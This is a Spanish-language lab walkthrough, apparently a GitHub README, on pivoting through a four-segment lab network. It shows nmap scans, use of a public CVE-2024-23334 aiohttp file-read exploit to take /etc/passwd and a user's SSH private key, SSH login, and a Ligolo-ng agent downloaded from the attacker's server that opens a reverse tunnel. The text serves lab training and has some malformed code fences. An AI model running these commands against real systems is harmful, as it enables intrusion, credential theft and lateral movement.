<img width="882" height="443" alt="image" src="https://github.com/user-attachments/assets/6a9c36f2-2543-4c88-88c4-8b6b4085cd01" />

# 🧠 Laboratorio de Pivoting y Movimiento Lateral

## 🏗️ Arquitectura de Red y Diseño del Escenario

Para dar inicio a este laboratorio, es fundamental comprender la topología de red diseñada. A diferencia de entornos de explotación lineal o de baja dificultad, este escenario presenta una arquitectura segmentada compuesta por **cuatro máquinas interconectadas**, distribuidas a través de **cuatro subredes lógicas distintas**.

![Arquitectura de Red](https://github.com/user-attachments/assets/fcb5e26c-7280-42b5-9099-5256ff562224)

---

## 🔀 Segmentación y Conectividad (Dual-Homed)

La característica crítica de esta infraestructura es que cada nodo intermedio está configurado como una máquina **dual-homed**.

Esto implica que cada activo posee al menos **dos interfaces de red** (físicas o virtuales) activas, permitiéndole:

- Coexistir en múltiples segmentos de red simultáneamente  
- Actuar como puente entre subredes  
- Facilitar el movimiento lateral  

💡 Esta configuración es el pilar del laboratorio, ya que estas máquinas funcionan como **gateways naturales** entre zonas que normalmente estarían completamente aisladas.

---

## 🗺️ Referencia Visual de la Infraestructura

Para facilitar el seguimiento de la intrusión y mantener una trazabilidad clara del progreso, se ha definido un esquema donde se detallan:

- Direccionamientos IP  
- Nombres de host  
- Relación entre segmentos de red  

Este esquema servirá como **hoja de ruta** a lo largo de toda la guía.

---

## 🎯 Objetivos Estratégicos y Metodología

El propósito central de este laboratorio es el perfeccionamiento de técnicas de **Pivoting**.

El ejercicio demanda que el operador sea capaz de:

- Tunelizar tráfico desde una red externa  
- Acceder a segmentos internos progresivamente  
- Utilizar cada máquina comprometida como un **jump server**  

---

## 🔄 Flujo del Compromiso

El éxito del ejercicio se define por la capacidad de comprometer todos los activos de forma escalonada:


RED 1 → RED 2 → RED 3 → RED 4


Cada sistema comprometido permite:

- Expandir el acceso dentro de la red  
- Establecer nuevos túneles  
- Alcanzar segmentos previamente inaccesibles  

---

## 🔐 Nota sobre la Escalada de Privilegios

Durante la fase de post-explotación en cada nodo, se realizaron auditorías exhaustivas mediante:

- Scripts de enumeración automatizada  
- Búsqueda de capabilities  
- Identificación de binarios SUID  
- Análisis de vulnerabilidades del kernel  

### 📌 Resultados

- ❌ No se identificaron vectores de escalada de privilegios críticos o intencionados  
- 🎯 El entorno está enfocado en el **movimiento lateral**  

---

## 🧩 Diseño del Reto

El laboratorio está optimizado específicamente para la práctica de:

- Pivoting  
- Enrutamiento interno  
- Gestión de túneles y proxies  

### 🔧 Herramientas recomendadas

- Chisel  
- Ligolo-ng  
- Metasploit (autoroute)  

---

## ✍️ Nota de Edición

Con el fin de mantener la guía concisa y enfocada en el aprendizaje del pivoting:

> Se han omitido los procesos de enumeración negativa relacionados con la escalada de privilegios.

Tras obtener acceso inicial en cada máquina, se procede directamente al:

- Establecimiento de túneles  
- Movimiento lateral hacia el siguiente objetivo  


# Reconocimiento inicial (máquina “Hospital”, 10.10.10.2)

Se inicia el reconocimiento mediante un ping a la máquina. Esto se hace por un lado para detectar que la máquina se encuentra accesible y por otro lado para poder detectar el sistema operativo mediante el TTL asignado.

```
ping -c 1 10.10.10.2
```

<img width="542" height="140" alt="image" src="https://github.com/user-attachments/assets/cef1e452-c001-44f3-9c47-70597eebf88b" />

Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux.

Una vez hecho esto, se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP SYN.

```ruby
sudo nmap -sS -p- --min-rate 1000 -n -Pn 10.10.10.2 -oN allPorts
```
<img width="520" height="280" alt="image" src="https://github.com/user-attachments/assets/beb731d2-1508-49f1-af4b-d1b5651a5092" />

En la segunda, se realiza un reconocimiento básico de los servicios subyacentes también mediante el uso de nmap. Esta vez, realizando dicha tarea de reconocimiento únicamente en los puertos detectados como abiertos.

```ruby
nmap -sCV -p 22,80,5000 -n -Pn 10.10.10.2 -oN services
```

<img width="826" height="341" alt="image" src="https://github.com/user-attachments/assets/42bff05a-f0cc-4e6d-b7ee-9c281ff39d4e" />

En este caso, se omite el escaneo de puertos UDP, ya que para esta máquina en particular no tiene ningún servicio relevante para llevar a cabo el ejercicio.

## 🚪 Acceso Inicial — drzunder (Máquina "Hospital" | 10.10.10.2)

### 🔍 Enumeración de Servicios

Durante la fase de reconocimiento inicial, se identificaron los siguientes puertos abiertos en el objetivo:

- **22/tcp** → Servicio SSH (*OpenSSH*)  
- **80/tcp** → Servicio HTTP (*Apache*)  
- **5000/tcp** → Servicio HTTP (*aiohttp 3.9.1*)  

Adicionalmente, mediante fingerprinting de servicios, se determinó que el sistema operativo subyacente es **Ubuntu**.

---

### ⚠️ Identificación de Vulnerabilidad

Tras analizar los servicios expuestos, se detectó que la aplicación web ejecutándose en el puerto **5000** es vulnerable a una **lectura arbitraria de archivos (LFI)**, correspondiente a la siguiente vulnerabilidad:

- **CVE-2024-23334**

Esta vulnerabilidad permite a un atacante acceder a archivos locales del sistema sin necesidad de autenticación, lo que resulta crítico en escenarios de post-explotación y recolección de credenciales.

---

### 🧨 Explotación

Se identificó un **Proof of Concept (PoC)** funcional disponible públicamente, el cual permite explotar la vulnerabilidad de forma directa:

- 🔗 CVE: https://nvd.nist.gov/vuln/detail/CVE-2024-23334  
- 🔗 Exploit: https://github.com/s4botai/CVE-2024-23334-PoC  

Una vez descargado el exploit, se procedió a su ejecución para validar la vulnerabilidad mediante la lectura del archivo `/etc/passwd`.

### 🧨 Exfiltración de la clave privada

```bash
wget https://raw.githubusercontent.com/s4botai/CVE-2024-23334-PoC/refs/heads/main/lfi.sh
chmod +x lfi.sh
./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /etc/passwdS
``` id="exploit-lfi"
````

<img width="964" height="507" alt="image" src="https://github.com/user-attachments/assets/b8bbcbd4-ba1b-415f-9feb-67f3f9c4ace6" />


La explotación fue exitosa, permitiendo la lectura de archivos locales del sistema objetivo. Esto confirma:

- La existencia de la vulnerabilidad LFI  
- La capacidad de acceder a información sensible  
- Un punto de apoyo inicial para continuar con la intrusión  

Este vector será clave para la obtención de credenciales y el posterior acceso al sistema a través de otros servicios como SSH.


### 🛠️ Preparación de la clave

Una vez obtenida, se guarda localmente y se ajustan los permisos requeridos por SSH:

```bash
nano drzunder-id_rsa
chmod 600 drzunder-id_rsa
``` id="prep-ssh"
```
### 🚪 Acceso remoto vía SSH

Se establece conexión con el sistema objetivo utilizando autenticación por clave:

```bash
ssh -i drzunder-id_rsa drzunder@10.10.10.2
```
Una vez dentro, se verifica el contexto de ejecución:

![Acceso SSH exitoso](https://github.com/user-attachments/assets/b6f1ac35-d7d2-4243-b1b5-dba87a78720f)


### 📌 Conclusión

La explotación de la vulnerabilidad permitió:

- Acceder a archivos sensibles del sistema  
- Exfiltrar la clave privada del usuario  
- Autenticarse vía SSH sin credenciales tradicionales  
- Obtener acceso interactivo al sistema  

Este punto representa un **acceso inicial completo**, habilitando fases posteriores como enumeración interna y técnicas de pivoting.

## 🔀 Pivoting 1 (10.10.10.0/24 → 20.20.20.0/24)

### 🧭 Identificación de doble interfaz (Dual-Homed)

En esta fase se detecta que la máquina comprometida **"Hospital"** pertenece a **dos segmentos de red distintos**, lo que la convierte en un candidato ideal para realizar pivoting.

La validación se realiza mediante la inspección del archivo `/etc/hosts`, donde se observa que el hostname está asociado a múltiples direcciones IP:

```bash
cat /etc/hosts
```
![Interfaces de red](https://github.com/user-attachments/assets/779ba088-88f5-42e1-a769-647dc194c184)

Este comportamiento confirma que el sistema actúa como un nodo **dual-homed**, es decir, con conectividad simultánea a:

- `10.10.10.0/24` (red inicial comprometida)  
- `20.20.20.0/24` (red interna no accesible directamente)  

---

### 🎯 Objetivo del Pivoting

Dado que ya se ha comprometido esta máquina, puede utilizarse como **primer pivote** para:

- Enumerar la red interna (`20.20.20.0/24`)  
- Descubrir nuevos activos  
- Establecer rutas de acceso hacia sistemas inaccesibles desde el exterior  

Este paso marca el inicio del **movimiento lateral real dentro del laboratorio**.

---

## ⚙️ Herramienta utilizada: Ligolo-ng

Para esta fase se utiliza **Ligolo-ng**, una herramienta moderna y eficiente para tunneling y pivoting.

🔗 Repositorio: https://github.com/Nicocha30/ligolo-ng  
🔗 Releases: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2  

---

### 🚀 Características clave

- Uso de interfaz **TUN** para redirección de tráfico  
- Soporte de **tráfico IP completo** (no solo puertos)  
- Compatible con herramientas nativas como:
  - `nmap`
  - `netexec`
  - `curl`, etc.  
- No requiere privilegios elevados en el host pivote  
- Conexión reversa mediante **TLS** (evasión de restricciones)  
- Simula acceso como si se estuviera dentro de la red interna  

💡 Esto permite trabajar de forma transparente, sin necesidad de configuraciones complejas adicionales.

---

## 🧩 Arquitectura de Ligolo-ng

Ligolo-ng se compone de dos elementos principales:

### 🖥️ Proxy (Atacante)

Se ejecuta en la máquina del operador y actúa como:

- Centro de control de túneles  
- Receptor de conexiones de agentes  
- Gestor de sesiones y rutas  

Permite:

- Listar sesiones activas  
- Configurar túneles  
- Redirigir tráfico  

---

### 🛰️ Agente (Víctima / Pivote)

Se ejecuta en la máquina comprometida (**Hospital**) y:

- Establece conexión reversa TLS hacia el proxy  
- Expone su red interna  
- Permite pivotar hacia otros segmentos  

---

## ▶️ Inicialización del Proxy

Una vez descargados los binarios correspondientes, se inicia el **proxy** en la máquina atacante.

> ⚠️ Se recomienda ejecutar este proceso en una terminal separada y mantenerla activa durante toda la operación.

```ruby
sudo ./proxy -selfcert
NFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                               
        /____/                          /____/                                                                                                
                                                                                                                                              
  Made in France ♥            by @Nicocha30!                                                                                                  
  Version: 0.8.3                                                                          

- El proxy quedará a la escucha en el puerto **11601** por defecto  
- Se utiliza un certificado autofirmado para la conexión TLS  
```

A## 🔗 Despliegue del Agente y Establecimiento del Túnel

Una vez inicializado el **proxy**, el siguiente paso consiste en conectar la máquina comprometida (**Hospital**) mediante el agente de Ligolo-ng.

Para ello, es necesario transferir el binario del agente al sistema objetivo, asignarle permisos de ejecución y establecer una conexión reversa hacia el proxy.

---

### 📦 Transferencia del agente

Desde la máquina atacante, se levanta un servidor HTTP temporal para facilitar la transferencia del binario:

```bash
python3 -m http.server 80
``` id="http-server"
```
---

### 📥 Descarga y preparación en la máquina pivote

En la máquina comprometida:

```bash
cd /tmp
wget http://10.10.10.1/agent
ls -al agent
chmod +x agent
``` id="agent-setup"
```

### 🚀 Ejecución del agente

Se ejecuta el agente indicando la dirección del proxy y deshabilitando la verificación del certificado:

```bash
./agent -connect 10.10.10.1:11601 -ignore-cert
``` id="agent-run"
```
![Ejecución del agente]<img width="1127" height="29" alt="image" src="https://github.com/user-attachments/assets/9d90e7ea-dbcd-4b71-b1d3-79541c0f2160" />




### 📡 Verificación de la conexión

Tras la ejecución, el agente establece una conexión reversa hacia el proxy. Desde la consola del proxy, se puede confirmar que la sesión ha sido registrada correctamente:

```bash
ligolo-ng » INFO[...] Agent joined. id=02420a0a0a02 name=drzunder@489a833a8b7e remote="10.10.10.2:53694"
``` id="agent-check"
```
<img width="1127" height="29" alt="image" src="https://github.com/user-attachments/assets/10e90139-3317-4a3c-8acf-c4da2dc41c88" />


### 📌 Resultado

En este punto:

- ✅ El agente se encuentra activo en la máquina pivote  
- ✅ El proxy ha registrado la sesión correctamente  
- ✅ Se ha establecido un canal de comunicación seguro (TLS)  

---

### 🧠 Conclusión

La conexión del agente marca un punto clave en el proceso de pivoting:

- Se habilita el acceso a la red interna desde la máquina atacante  
- Se establece la base para el enrutamiento de tráfico  
- Se permite interactuar con la red `20.20.20.0/24` como si se estuviera dentro de ella  

El siguiente paso consistirá en configurar la interfaz TUN y comenzar la enumeración de la red interna.
